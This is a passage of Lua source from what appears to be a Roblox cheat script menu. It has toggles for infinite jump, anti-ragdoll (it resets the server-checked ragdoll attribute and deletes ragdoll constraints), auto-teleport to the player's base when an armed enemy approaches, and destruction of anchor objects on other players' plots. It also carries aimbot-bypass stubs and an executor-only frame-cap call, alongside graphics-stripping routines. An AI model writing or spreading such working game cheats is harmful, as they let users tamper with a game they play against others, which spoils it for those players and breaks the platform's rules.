    if M.mobBtnRefs.bypass then
        M.mobBtnRefs.bypass(M.bypassAimbotEnabled)
    end
    saveCherryConfig()
    return M.bypassAimbotEnabled
end



function M.getClosestTargetBody() return nil end
function M._bodyLockTick() end
function M.startBodyLock() M.bodyLockEnabled = false end
function M.stopBodyLock() M.bodyLockEnabled = false; if M.bodyLockConn then pcall(function() M.bodyLockConn:Disconnect() end); M.bodyLockConn = nil end end
function M._suppressBodyLock() end
function M._unsuppressBodyLock() end
function M.toggleBodyLock() M.bodyLockEnabled = false; return false end





function M.showHardHitRing()
    local char = player.Character
    if not char then return end
    local hrp2 = char:FindFirstChild("HumanoidRootPart")
    if not hrp2 then return end
    if M._hardHitRing and M._hardHitRing.Parent then return end
    local cyl = Instance.new("CylinderHandleAdornment")
    cyl.Name = "VynxHardHitRing"
    cyl.Adornee = hrp2
    cyl.Color3 = (UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(235, 235, 235))
    cyl.AlwaysOnTop = true
    cyl.Transparency = 0.15
    cyl.Radius = tonumber(M.hardHitRadius) or 10
    cyl.InnerRadius = math.max((tonumber(M.hardHitRadius) or 10) - 0.3, 0.1)
    cyl.Height = 0.15
    cyl.CFrame = CFrame.new(0, -3, 0)
    cyl.Parent = hrp2
    M._hardHitRing = cyl
end

function M.hideHardHitRing()
    if M._hardHitRing then
        pcall(function() M._hardHitRing:Destroy() end)
        M._hardHitRing = nil
    end
end

function M.startHardHit()
    if M._hardHitConn then return end
    M.hardHitEnabled = true
    M.showHardHitRing()
    M._hardHitConn = RunService.Heartbeat:Connect(function()
        if not M.hardHitEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        if not M._hardHitRing or not M._hardHitRing.Parent then
            M.showHardHitRing()
        end
        if M._hardHitRing then
            local r = tonumber(M.hardHitRadius) or 10
            M._hardHitRing.Radius = r
            M._hardHitRing.InnerRadius = math.max(r - 0.3, 0.1)
            local accent = UI_ACCENT or CHERRY_ACCENT
            if accent then M._hardHitRing.Color3 = accent end
        end
    end)
end

function M.stopHardHit()
    M.hardHitEnabled = false
    if M._hardHitConn then
        pcall(function() M._hardHitConn:Disconnect() end)
        M._hardHitConn = nil
    end
    M.hideHardHitRing()
end




function M.applyUltraDerender(obj)
    if not obj then return end
    if M._isUnderPlots and M._isUnderPlots(obj) then return end
    pcall(function()
        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
            obj.Material = Enum.Material.Plastic
            obj.Reflectance = 0
            obj.CastShadow = false
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            obj:Destroy()
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
            or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            obj.Enabled = false
        elseif obj:IsA("Accessory") or obj:IsA("Hat") then
            local char = obj:FindFirstAncestorOfClass("Model")
            if char and Players:GetPlayerFromCharacter(char) then
                obj:Destroy()
            end
        end
    end)
end

function M.enableUltraMode()
    M.ultraModeEnabled = true
    local L = Lighting
    M.defLightBrightness = M.defLightBrightness or L.Brightness
    M.defLightClock = M.defLightClock or L.ClockTime
    M.defLightAmbient = M.defLightAmbient or L.OutdoorAmbient
    L.GlobalShadows = false
    L.FogEnd = 1e10
    L.Brightness = 1
    L.EnvironmentDiffuseScale = 0
    L.EnvironmentSpecularScale = 0
    for _, e in pairs(L:GetChildren()) do
        pcall(function()
            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
                or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                e.Enabled = false
            end
        end)
    end
    for _, obj in pairs(workspace:GetDescendants()) do
        M.applyUltraDerender(obj)
    end
    if M._ultraDescConn then pcall(function() M._ultraDescConn:Disconnect() end) end
    M._ultraDescConn = workspace.DescendantAdded:Connect(function(obj)
        if not M.ultraModeEnabled then return end
        M.applyUltraDerender(obj)
    end)
    pcall(function()
        if setfpscap then setfpscap(999999999) end
    end)
end

function M.disableUltraMode()
    M.ultraModeEnabled = false
    if M._ultraDescConn then
        pcall(function() M._ultraDescConn:Disconnect() end)
        M._ultraDescConn = nil
    end
end






function M.doAutoTPDown(force)
    local char=player.Character;if not char then return end;local hrp=char:FindFirstChild("HumanoidRootPart");if not hrp then return end
    local hum2=char:FindFirstChildOfClass("Humanoid");if not hum2 then return end
    if not force then if hum2.FloorMaterial~=Enum.Material.Air then return end;if not(hrp.Position.Y>=M.autoTPHeight) then return end end
    hrp.CFrame=CFrame.new(hrp.Position.X,-7.00,hrp.Position.Z)*CFrame.Angles(0,select(2,hrp.CFrame:ToEulerAnglesYXZ()),0);hrp.Velocity=Vector3.zero
end

function M.startAutoTP()
    if M.autoTPConn then task.cancel(M.autoTPConn);M.autoTPConn=nil end
    M.autoTPConn=task.spawn(function() while M.autoTPEnabled do task.wait(0.1);pcall(function() M.doAutoTPDown(false) end) end end)
end

function M.stopAutoTP() M.autoTPEnabled=false;if M.autoTPConn then task.cancel(M.autoTPConn);M.autoTPConn=nil end end

function M.runTPFloor() pcall(function() M.doAutoTPDown(true) end) end

function M.enableStretchRez()
    M.stretchRezEnabled=true;if M.stretchRezConn then M.stretchRezConn:Disconnect() end
    pcall(function() RunService:UnbindFromRenderStep("Movee_Stretch") end)
    pcall(function() RunService:BindToRenderStep("Movee_Stretch",Enum.RenderPriority.Last.Value-1,function() local cam=workspace.CurrentCamera;if cam then cam.CFrame=cam.CFrame*CFrame.new(0,0,0,1,0,0,0,0.8,0,0,0,1) end end) end)
end

function M.disableStretchRez() M.stretchRezEnabled=false;pcall(function() RunService:UnbindFromRenderStep("Movee_Stretch") end) end




function M.isSummerBaseName(name)
    if not name then return false end
    local n = tostring(name):lower()
    
    return n == "summerbase"
        or n == "summer_base"
        or n:find("summerbase", 1, true) ~= nil
        or n:find("summer_base", 1, true) ~= nil
end

function M.isAnchorName(name)
    if not name then return false end
    local n = tostring(name):lower()
    return n == "anchor" or n == "anchors"
end

function M.stripBlockingAnchor(obj)
    if not obj or not obj.Parent then return end
    local key = tostring(obj:GetFullName())
    if M._antiSummerCleaned[key] then return end
    M._antiSummerCleaned[key] = true
    pcall(function()
        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
            obj.CanCollide = false
            obj.CanQuery = false
            obj.CanTouch = false
            obj.Transparency = 1
        end
        obj:Destroy()
    end)
end

function M.cleanSummerBaseAnchors()
    if not M.antiSummerBaseEnabled then return end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return end

    
    for _, plot in ipairs(plots:GetChildren()) do
        local isSummer = M.isSummerBaseName(plot.Name)
        if not isSummer then
            for _, d in ipairs(plot:GetDescendants()) do
                if M.isSummerBaseName(d.Name) then
                    isSummer = true
                    break
                end
            end
        end
        if not isSummer then continue end
        
        for _, d in ipairs(plot:GetDescendants()) do
            if M.isAnchorName(d.Name) then
                M.stripBlockingAnchor(d)
            end
        end
    end
end

function M.enableAntiSummerBase()
    M.antiSummerBaseEnabled = true
    M._antiSummerCleaned = {}
    M.cleanSummerBaseAnchors()
    if M.antiSummerBaseConn then
        pcall(function() M.antiSummerBaseConn:Disconnect() end)
        M.antiSummerBaseConn = nil
    end
    M.antiSummerBaseConn = workspace.DescendantAdded:Connect(function(obj)
        if not M.antiSummerBaseEnabled then return end
        if not M.isAnchorName(obj.Name) then return end
        task.defer(function()
            if not M.antiSummerBaseEnabled or not obj.Parent then return end
            
            local p = obj
            local underPlots, nearSummer = false, false
            while p and p ~= workspace do
                if p.Name == "Plots" or (p.Parent and p.Parent.Name == "Plots") then underPlots = true end
                if M.isSummerBaseName(p.Name) then nearSummer = true end
                p = p.Parent
            end
            if underPlots and nearSummer then
                M.stripBlockingAnchor(obj)
            end
        end)
    end)
    task.spawn(function()
        while M.antiSummerBaseEnabled do
            M.cleanSummerBaseAnchors()
            task.wait(5) 
        end
    end)
end

function M.disableAntiSummerBase()
    M.antiSummerBaseEnabled = false
    if M.antiSummerBaseConn then
        pcall(function() M.antiSummerBaseConn:Disconnect() end)
        M.antiSummerBaseConn = nil
    end
end

function M._isUnderPlots(obj)
    local p = obj
    while p and p ~= workspace do
        if p.Name == "Plots" then return true end
        p = p.Parent
    end
    return false
end

function M.applyAntiLagDerender(obj)
    if not obj then return end
    
    if M._isUnderPlots(obj) then return end
    pcall(function()
        if obj:IsA("Accessory") or obj:IsA("Hat") then
            
            local char = obj:FindFirstAncestorOfClass("Model")
            if char and Players:GetPlayerFromCharacter(char) then
                obj:Destroy()
            end
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
            or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            obj.Enabled = false
        elseif obj:IsA("BasePart") or obj:IsA("MeshPart") then
            
            obj.CastShadow = false
            if obj.Reflectance and obj.Reflectance > 0 then
                obj.Reflectance = 0
            end
        end
        
    end)
end

function M.enableAntiLag()
    M.removeAccessoriesEnabled = true
    M.antiLagEnabled = true
    M.defLightBrightness = M.defLightBrightness or Lighting.Brightness
    M.defLightClock = M.defLightClock or Lighting.ClockTime
    M.defLightAmbient = M.defLightAmbient or Lighting.OutdoorAmbient
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 1e10
    Lighting.Brightness = 1
    Lighting.EnvironmentDiffuseScale = 0
    Lighting.EnvironmentSpecularScale = 0
    for _, e in pairs(Lighting:GetChildren()) do
        pcall(function()
            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect")
                or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                e.Enabled = false
            end
        end)
    end
    
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Character then
            for _, obj in ipairs(plr.Character:GetDescendants()) do
                M.applyAntiLagDerender(obj)
            end
        end
    end
    if M.antiLagDescConn then M.antiLagDescConn:Disconnect() end
    M.antiLagDescConn = workspace.DescendantAdded:Connect(function(obj)
        if not M.antiLagEnabled then return end
        if M._isUnderPlots(obj) then return end
        M.applyAntiLagDerender(obj)
    end)
end

function M.disableAntiLag()
    M.removeAccessoriesEnabled=false;M.antiLagEnabled=false;if M.antiLagDescConn then M.antiLagDescConn:Disconnect();M.antiLagDescConn=nil end
    pcall(function() if M.defLightBrightness then Lighting.Brightness=M.defLightBrightness end;if M.defLightClock then Lighting.ClockTime=M.defLightClock end;if M.defLightAmbient then Lighting.OutdoorAmbient=M.defLightAmbient end;Lighting.ExposureCompensation=0 end)
end




M.antiRagdollNoSplatterCooldown = 0





M.nukeOptEnabled = false
M._NukeOn = false
M._NukeConns = {}
M._NukeThreads = {}

function M.enableNukeOptimizer()
    if M._NukeOn then return end
    M._NukeOn = true
    M.nukeOptEnabled = true
    local LightingSvc = game:GetService("Lighting")
    local MaterialService = game:GetService("MaterialService")
    local XMin, XMax = -560, -240
    local ClothingClasses = {"Shirt","Pants","ShirtGraphic","Accessory","Hat","HairAccessory","FaceAccessory","NeckAccessory","ShoulderAccessory","FrontAccessory","BackAccessory","WaistAccessory"}
    local BASE_NAMES = {"baseplate","spawnlocation","spawn location","spawn"}
    local function IsUnderPlots(obj)
        
        if not obj then return false end
        if M._isUnderPlots and M._isUnderPlots(obj) then return true end
        local p = obj
        while p and p ~= game do
            if p.Name == "Plots" or p.Name == "AnimalPodiums" or p.Name == "PlotSign" then
                return true
            end
            local nl = tostring(p.Name):lower()
            if nl:find("plot", 1, true) or nl:find("base", 1, true) and p:IsA("Model") then
                
                local q = p.Parent
                while q and q ~= game do
                    if q.Name == "Plots" then return true end
                    q = q.Parent
                end
            end
            p = p.Parent
        end
        return false
    end
    local function SafeDestroy(obj)
        if not obj or obj.Name == "Overhead" then return end
        if IsUnderPlots(obj) then return end
        
        if obj:IsA("Beam") or obj:IsA("Laser") then return end
        pcall(function() obj:Destroy() end)
    end
    local function IsClothing(obj)
        for _, c in ipairs(ClothingClasses) do if obj:IsA(c) then return true end end
        return false
    end
    local function IsCharacterPart(obj)
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and obj:IsDescendantOf(plr.Character) then return true end
        end
        return false
    end
    local function IsOutOfRange(obj)
        if IsUnderPlots(obj) then return false end
        if obj:IsA("BasePart") then
            local x = obj.Position.X
            return x < XMin or x > XMax
        end
        return false
    end
    local function IsBase(obj)
        
        if IsUnderPlots(obj) then return false end
        if not obj:IsA("BasePart") then return false end
        local nl = obj.Name:lower()
        for _, n in ipairs(BASE_NAMES) do
            if nl:find(n, 1, true) then return true end
        end
        return false
    end
    local function IsInBase(obj)
        if IsUnderPlots(obj) then return true end 
        local p = obj.Parent
        while p and p ~= workspace do
            if IsBase(p) then return true end
            p = p.Parent
        end
        return false
    end
    local function MakeTransparent(obj)
        
        if IsUnderPlots(obj) then return end
        pcall(function()
            if IsBase(obj) and not IsCharacterPart(obj) then
                obj.Transparency = 1
                obj.CastShadow = false
            end
        end)
    end
    local function StripObject(obj)
        pcall(function()
            if obj:IsA("Texture") or obj:IsA("Decal") or obj:IsA("SpecialMesh") then
                SafeDestroy(obj)
            elseif obj:IsA("Beam") then
                
                return
            elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                pcall(function() obj.Enabled = false end)
                SafeDestroy(obj)
            elseif obj:IsA("SurfaceAppearance") then
                SafeDestroy(obj)
            elseif obj:IsA("BasePart") then
                obj.CastShadow = false
                obj.Material = Enum.Material.Plastic
                pcall(function() obj.MaterialVariant = "" end)
                obj.Reflectance = 0
            end
        end)
    end
    local function CleanObject(obj)
        pcall(function()
            if obj:IsA("SurfaceAppearance") then
                SafeDestroy(obj)
            elseif obj:IsA("Decal") or obj:IsA("Texture") then
                if not (obj.Name == "face" and obj.Parent and obj.Parent.Name == "Head") then
                    SafeDestroy(obj)
                end
            elseif obj:IsA("SpecialMesh") then
                SafeDestroy(obj)
            end
        end)
    end
    local function ApplyGreySky()
        pcall(function()
            for _, obj in ipairs(LightingSvc:GetChildren()) do
                if obj:IsA("Sky") then obj:Destroy() end
            end
            local sky = Instance.new("Sky")
            sky.SkyboxBk = ""; sky.SkyboxDn = ""; sky.SkyboxFt = ""
            sky.SkyboxLf = ""; sky.SkyboxRt = ""; sky.SkyboxUp = ""
            sky.CelestialBodiesShown = false
            sky.Name = "_VynxNukeSky"
            sky.Parent = LightingSvc
        end)
    end
    local function OptimizeLighting()
        LightingSvc.GlobalShadows = false
        LightingSvc.FogEnd = 9e9
        LightingSvc.FogStart = 9e9
        LightingSvc.EnvironmentDiffuseScale = 0
        LightingSvc.EnvironmentSpecularScale = 0
        LightingSvc.Brightness = 1.5
        LightingSvc.Ambient = Color3.fromRGB(60, 60, 60)
        for _, v in ipairs(LightingSvc:GetChildren()) do
            if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect")
                or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect")
                or v:IsA("Atmosphere") or v:IsA("Clouds") then
                v:Destroy()
            end
        end
        ApplyGreySky()
    end
    local function ApplyTerrain()
        pcall(function()
            local t = workspace:FindFirstChildOfClass("Terrain")
            if t then
                t.Decoration = false
                pcall(function() t.WaterWaveSize = 0 end)
                pcall(function() t.WaterWaveSpeed = 0 end)
                pcall(function() t.WaterReflectance = 0 end)
                pcall(function() t.WaterTransparency = 1 end)
            end
        end)
    end
    local function OptimizeCharacter(char)
        if not char then return end
        task.spawn(function()
            task.wait(0.3)
            if not M._NukeOn then return end
            for _, obj in ipairs(char:GetDescendants()) do
                if IsClothing(obj) then SafeDestroy(obj) else CleanObject(obj) end
            end
        end)
    end
    pcall(function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
    end)
    pcall(function() if setfpscap then setfpscap(999) end end)
    table.insert(M._NukeThreads, task.spawn(function()
        if not game:IsLoaded() then game.Loaded:Wait() end
        OptimizeLighting()
        ApplyTerrain()
        for _, obj in ipairs(workspace:GetDescendants()) do
            if not M._NukeOn then return end
            if IsUnderPlots(obj) then
                
            elseif IsBase(obj) then
                MakeTransparent(obj)
            elseif IsClothing(obj) then
                SafeDestroy(obj)
            elseif IsInBase(obj) then
            elseif IsCharacterPart(obj) then
            elseif IsOutOfRange(obj) then
                SafeDestroy(obj)
            else
                CleanObject(obj)
                StripObject(obj)
            end
        end
        for _, obj in ipairs(workspace:GetDescendants()) do
            if not IsUnderPlots(obj) then
                MakeTransparent(obj)
            end
        end
    end))
    table.insert(M._NukeConns, workspace.DescendantAdded:Connect(function(obj)
        if not M._NukeOn then return end
        task.defer(function()
            if not M._NukeOn then return end
            if IsUnderPlots(obj) then return end
            if IsBase(obj) then MakeTransparent(obj); return end
            if IsClothing(obj) then SafeDestroy(obj)
            elseif IsInBase(obj) then
            elseif IsCharacterPart(obj) then
            elseif IsOutOfRange(obj) then SafeDestroy(obj)
            else CleanObject(obj); StripObject(obj) end
        end)
    end))
    table.insert(M._NukeConns, LightingSvc.DescendantAdded:Connect(function(obj)
        if not M._NukeOn then return end
        if obj:IsA("Atmosphere") or obj:IsA("Clouds") or obj:IsA("PostEffect") then
            SafeDestroy(obj)
        end
    end))
    table.insert(M._NukeConns, MaterialService.DescendantAdded:Connect(function(obj)
        if not M._NukeOn then return end
        SafeDestroy(obj)
    end))
    for _, plr in ipairs(Players:GetPlayers()) do
        OptimizeCharacter(plr.Character)
        table.insert(M._NukeConns, plr.CharacterAdded:Connect(OptimizeCharacter))
    end
    table.insert(M._NukeConns, Players.PlayerAdded:Connect(function(plr)
        table.insert(M._NukeConns, plr.CharacterAdded:Connect(OptimizeCharacter))
    end))
    table.insert(M._NukeThreads, task.spawn(function()
        while M._NukeOn do
            task.wait(15)
            pcall(function() collectgarbage("collect") end)
        end
    end))
end

function M.disableNukeOptimizer()
    M._NukeOn = false
    M.nukeOptEnabled = false
    for _, c in ipairs(M._NukeConns) do pcall(function() c:Disconnect() end) end
    M._NukeConns = {}
    M._NukeThreads = {}
end


function M.forceNoSplatterReset()
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root or hum.Health <= 0 then return end

    pcall(function()
        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
        root.Velocity = Vector3.zero
        root.RotVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero

        for _, obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Motor6D") then obj.Enabled = true end
            if obj:IsA("Constraint") then obj.Enabled = true end
        end

        workspace.CurrentCamera.CameraSubject = hum

        local PM = player.PlayerScripts:FindFirstChild("PlayerModule")
        if PM then
            local CM = require(PM:FindFirstChild("ControlModule"))
            if CM then CM:Enable() end
        end

        hum.AutoRotate = true
        hum.PlatformStand = false
        hum.Sit = false
    end)
end

function M.startAntiRagdoll()
    if M.Conns.antiRag then return end
    M.Conns.antiRag = RunService.Heartbeat:Connect(function()
        if not M.antiRagdollEnabled then return end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or hum.Health <= 0 then return end

        local state = hum:GetState()
        local ragdolled = (state == Enum.HumanoidStateType.Physics or
                          state == Enum.HumanoidStateType.Ragdoll or
                          state == Enum.HumanoidStateType.FallingDown)

        if M.antiRagdollMode == "No Splatter" then
            if ragdolled then
                local now = tick()
                if now - (M.antiRagdollNoSplatterCooldown or 0) > 0.15 then
                    M.antiRagdollNoSplatterCooldown = now
                    M.forceNoSplatterReset()
                end
            end
            return
        end

        if not root then return end
        local endTime = player:GetAttribute("RagdollEndTime")
        if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then
            ragdolled = true
        end
        if ragdolled then
            pcall(function()
                player:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
            end)
            for _, d in ipairs(char:GetDescendants()) do
                if d:IsA("BallSocketConstraint") or
                   (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then
                    d:Destroy()
                end
            end
            for _, obj in ipairs(char:GetDescendants()) do
                if obj:IsA("Motor6D") and obj.Enabled == false then
                    obj.Enabled = true
                end
            end
            if hum.Health > 0 then
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
            workspace.CurrentCamera.CameraSubject = hum
            root.Anchored = false
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end)
end

function M.stopAntiRagdoll()
    if M.Conns.antiRag then
        M.Conns.antiRag:Disconnect()
        M.Conns.antiRag = nil
    end
end




function M.getMyBaseCFrame()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    for _, plot in ipairs(plots:GetChildren()) do
        if not plot:IsA("Model") then continue end
        local sign = plot:FindFirstChild("PlotSign")
        local yb = sign and sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") and yb.Enabled == true then
            
            local spawn = plot:FindFirstChild("Spawn", true)
            if spawn and spawn:IsA("BasePart") then
                return spawn.CFrame + Vector3.new(0, 3, 0)
            end
            local ok, pivot = pcall(function() return plot:GetPivot() end)
            if ok and pivot then
                return pivot + Vector3.new(0, 5, 0)
            end
            if sign:IsA("BasePart") then
                return sign.CFrame + Vector3.new(0, 5, 0)
            end
            local pp = sign:FindFirstChildWhichIsA("BasePart", true)
            if pp then
                return pp.CFrame + Vector3.new(0, 5, 0)
            end
        end
    end
    return nil
end

function M.isEnemyBatNearby(range)
    range = tonumber(range) or M.ragdollTPBaseRange or 50
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    local myPos = hrp.Position
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - myPos).Magnitude
                if dist <= range then
                    
                    local tool = plr.Character:FindFirstChildOfClass("Tool")
                    if tool then
                        local n = tool.Name:lower()
                        if n:find("bat") or n:find("slap") then
                            return true
                        end
                    end
                    
                    return true
                end
            end
        end
    end
    return false
end

function M.tpToMyBaseFromRagdoll()
    local cf = M.getMyBaseCFrame()
    if not cf then return false end
    local char = player.Character
    if not char then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hrp then return false end
    pcall(function()
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.CFrame = cf
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        if hum and hum.Health > 0 then
            hum.PlatformStand = false
            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
            task.defer(function()
                if hum and hum.Parent then
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end
            end)
        end
    end)
    return true
end

function M.tryRagdollTPBase()
    if not M.ragdollTPBaseEnabled then return end
    local now = tick()
    if now - (M._ragdollTPLast or 0) < (tonumber(M.ragdollTPBaseCooldown) or 1.5) then return end
    if not M.isEnemyBatNearby(M.ragdollTPBaseRange) then return end
    M._ragdollTPLast = now
    task.defer(function()
        task.wait(0.05)
        if not M.ragdollTPBaseEnabled then return end
        local char = player.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return end
        local st = hum:GetState()
        local stillRag = hum.PlatformStand
            or st == Enum.HumanoidStateType.Physics
            or st == Enum.HumanoidStateType.Ragdoll
            or st == Enum.HumanoidStateType.FallingDown
        if stillRag or true then
            M.tpToMyBaseFromRagdoll()
        end
    end)
end

function M._hookRagdollTPOnChar(char)
    if M._ragdollTPCharConn then
        pcall(function() M._ragdollTPCharConn:Disconnect() end)
        M._ragdollTPCharConn = nil
    end
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
    if not hum then return end
    M._ragdollTPCharConn = hum.StateChanged:Connect(function(_, new)
        if not M.ragdollTPBaseEnabled then return end
        if new == Enum.HumanoidStateType.Physics
            or new == Enum.HumanoidStateType.Ragdoll
            or new == Enum.HumanoidStateType.FallingDown then
            M.tryRagdollTPBase()
        end
    end)
    
    hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
        if not M.ragdollTPBaseEnabled then return end
        if hum.PlatformStand then
            M.tryRagdollTPBase()
        end
    end)
end

function M.startRagdollTPBase()
    M.ragdollTPBaseEnabled = true
    if player.Character then
        M._hookRagdollTPOnChar(player.Character)
    end
    if not M._ragdollTPAddedConn then
        M._ragdollTPAddedConn = player.CharacterAdded:Connect(function(char)
            task.wait(0.2)
            if M.ragdollTPBaseEnabled then
                M._hookRagdollTPOnChar(char)
            end
        end)
    end
end

function M.stopRagdollTPBase()
    M.ragdollTPBaseEnabled = false
    if M._ragdollTPCharConn then
        pcall(function() M._ragdollTPCharConn:Disconnect() end)
        M._ragdollTPCharConn = nil
    end
end





M.jumpHeld = false
M.infJumpThread = nil
M._infJumpBoosting = false
M._infJumpLastBoost = 0
M.INF_JUMP_BOOST_FORCE = 25
M.INF_JUMP_BOOST_FRAMES = 2
M.INF_JUMP_BOOST_COOLDOWN = 0.12

local function M_applyInfJumpBoost(root)
    if not root or M._infJumpBoosting then return end
    local now = tick()
    if now - M._infJumpLastBoost < M.INF_JUMP_BOOST_COOLDOWN then return end
    M._infJumpLastBoost = now
    M._infJumpBoosting = true

    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(0, math.huge, 0)
    bv.P = 1250
    bv.Velocity = Vector3.new(root.Velocity.X, M.INF_JUMP_BOOST_FORCE, root.Velocity.Z)
    bv.Parent = root

    local frameCount = 0
    local conn
    conn = RunService.Heartbeat:Connect(function()
        if frameCount < M.INF_JUMP_BOOST_FRAMES then
            frameCount = frameCount + 1
            if bv and bv.Parent then
                bv.Velocity = bv.Velocity + Vector3.new(0, 0.01, 0)
            end
        else
            if bv then pcall(function() bv:Destroy() end) end
            if conn then conn:Disconnect() end
            M._infJumpBoosting = false
        end
    end)
end

task.spawn(function()
    local pg = player:WaitForChild("PlayerGui", 10)
    if pg then
        local function hookJumpButton(btn)
            if btn:IsA("GuiButton") and btn.Name == "JumpButton" and not btn:GetAttribute("InfJumpHooked") then
                btn:SetAttribute("InfJumpHooked", true)
                btn.MouseButton1Down:Connect(function()
                    if M.infJumpEnabled then
                        M.jumpHeld = true
                    end
                end)
                btn.MouseButton1Up:Connect(function() M.jumpHeld = false end)
                btn.MouseLeave:Connect(function() M.jumpHeld = false end)
            end
        end
        for _, d in ipairs(pg:GetDescendants()) do hookJumpButton(d) end
        pg.DescendantAdded:Connect(hookJumpButton)
    end
end)

UIS.JumpRequest:Connect(function()
    
end)

UIS.InputBegan:Connect(function(inp, gpe)
    if gpe then return end
    if M.infJumpEnabled
        and inp.UserInputType == Enum.UserInputType.Keyboard
        and inp.KeyCode == Enum.KeyCode.Space then
        M.jumpHeld = true
    end
end)

UIS.InputEnded:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode == Enum.KeyCode.Space then
        M.jumpHeld = false
    end
end)

function M.startManualInfJumpLoop()
    
    M.startHoldInfJump()
end

function M.stopManualInfJumpLoop()
    if M.infJumpThread then
        M.infJumpThread:Disconnect()
        M.infJumpThread = nil
    end
    M.jumpHeld = false
    M._infJumpBoosting = false
end

function M.startHoldInfJump()
    if M.holdInfJumpConn then M.holdInfJumpConn:Disconnect() end
    M.holdInfJumpConn = RunService.Heartbeat:Connect(function()
        if not M.infJumpEnabled then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        
        local isJumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or M.jumpHeld or (hum.Jump == true)
        local vel = root.AssemblyLinearVelocity
        if isJumpHeld and vel.Y < 35 then
            root.AssemblyLinearVelocity = Vector3.new(vel.X, 55, vel.Z)
        end
        
        vel = root.AssemblyLinearVelocity
        if vel.Y < -120 then
            root.AssemblyLinearVelocity = Vector3.new(vel.X, -55, vel.Z)
        end
    end)
end

function M.stopHoldInfJump()
    if M.holdInfJumpConn then
        M.holdInfJumpConn:Disconnect()
        M.holdInfJumpConn = nil
    end
end




function M.forceRestoreWalkAnims(char)
    M.unwalkEnabled = false
    char = char or player.Character
    if not char then return end
    pcall(function()
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            for _, t in ipairs(hum:GetPlayingAnimationTracks()) do
                pcall(function() t:Stop(0) end)
            end
            hum.PlatformStand = false
            hum.Sit = false
            if (hum.WalkSpeed or 0) < 1 then hum.WalkSpeed = 16 end
        end
    end)
    
    if M.animPackEnabled and M.animPack and M.PACKS and M.PACKS[M.animPack] then
        pcall(function() M.applyAnimPack(M.animPack) end)
        return
    end
    
    if not char:FindFirstChild("Animate") then
        if M.restoreOriginalAnimate then
            pcall(function() M.restoreOriginalAnimate(char) end)
        end
    end
    if not char:FindFirstChild("Animate") then
        pcall(function()
            local sp = game:GetService("StarterPlayer")
            local scs = sp:FindFirstChild("StarterCharacterScripts")
            local tmpl = scs and scs:FindFirstChild("Animate")
            if tmpl then
                local clone = tmpl:Clone()
                clone.Parent = char
            end
        end)
    end
    if M.resetAnimations and not (M.animPackEnabled and M.animPack) then
        
    end
end

function M.startUnwalk() M.unwalkEnabled = false return end
function M.stopUnwalk() M.unwalkEnabled = false end

